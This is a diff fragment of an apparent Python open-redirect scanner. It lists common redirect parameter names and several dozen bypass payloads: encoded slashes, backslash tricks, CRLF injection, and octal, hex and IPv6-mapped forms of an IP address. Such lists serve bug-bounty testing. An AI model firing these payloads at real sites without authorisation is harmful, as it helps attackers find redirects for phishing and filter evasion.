@@ -16,7 +16,6 @@ print("""\033[2;31m
 
 paramL = ['?url=','?next=','?target=','?rurl=','?dest=','?destination=','?redir=','?redirect_uri=','?redirect_url=','?redirect=','/redirect/','/cgi-bin/redirect.cgi?', '/out/', '/out?','?view=','/login?to=','?image_url=','?go=','?return=','?returnTo=', '?return_to=','?checkout_url=','?continue=','?return_path=','?newurl=','?path=']
 newurls = []
-filepath = 'urls.txt'
 payloads = ['http://www.google.com','/%09/google.com','/%5cgoogle.com', 'https://google%252ecom','https://google.com%E3%80%82.com', '//www.google.com/%2f%2e%2e', '//www.google.com/%2e%2e','//google.com/','//google.com/%2f..', '//\google.com', '/\victim.com:80%40google.com', '//google.com//%2F%2E%2', 'http://[::ffff:216.58.214.206', 'http:[::ffff:216.58.214.206', 'http://00330.00072.0000326.0000031', 'http:00330.00072.0000326.0000031', 'http://00330.0x3a.5499', 'http:00330.0x3a.5499', 'http://00330.385607', 'http:00330.385607', 'http://0330.072.0326.031', 'http:0330.072.0326.031', 'http:%0a%0dgoogle.co', 'http://0xd8.072.5499', 'http:0xd8.072.5499', 'http://0xd8.0x3a.0xd6.0xc', 'http:0xd8.0x3a.0xd6.0xc', 'http://0xd8.385607', 'http:0xd8.385607', 'http://0xACD90CCE', 'http://[::216.58.214.206', 'http:[::216.58.214.206']
 def Args():
 
